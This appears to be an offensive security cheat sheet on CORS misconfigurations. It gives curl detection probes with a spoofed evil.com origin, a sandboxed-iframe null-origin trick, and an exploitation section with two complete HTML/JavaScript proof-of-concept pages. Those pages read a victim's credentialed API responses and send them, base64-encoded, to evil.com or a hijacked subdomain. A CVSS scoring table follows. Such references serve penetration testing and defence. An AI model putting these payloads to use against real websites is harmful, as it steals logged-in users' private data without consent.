# CORS Misconfiguration: Complete Reference

## Detection

### Origin Reflection
```bash
# If the server reflects back any origin
curl -H "Origin: https://evil.com" https://target.com/api/sensitive
# Response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

### Null Origin
```bash
# Some servers trust null origin
curl -H "Origin: null" https://target.com/api/user
curl -H "Origin: file://" https://target.com/api/user

# Sandboxed iframe can send null origin requests
<iframe sandbox="allow-scripts" src="https://target.com/api/user"></iframe>
```

### Wildcard with Credentials
```bash
# If Access-Control-Allow-Credentials is set with wildcard origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# This SHOULD fail per spec, but some implementations allow it
```

### Preflight Bypass
```bash
# Some endpoints skip preflight for simple requests (GET, POST with URL-encoded)
# They still include CORS headers in response
curl -X GET -H "Origin: https://evil.com" https://target.com/api/user
```

## Exploitation

### Dynamic Origin Reflection
```html
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://evil.com/steal?data=' + encodeURIComponent(btoa(xhr.responseText)));
};
xhr.send();
</script>
</body>
</html>
```

### Subdomain Takeover Based
```html
<!-- If target trusts subdomains -->
<!-- Takeover a subdomain first, then exploit CORS from there -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/admin', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://taken-subdomain.com/steal?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| CORS reflection -> data theft | 6.1 | Network, Low, User interaction required |
| CORS null origin -> sandboxed iframe steal | 8.1 | Network, Low, User interaction required |
| CORS wildcard with credentials | 7.5 | Network, Low, No auth |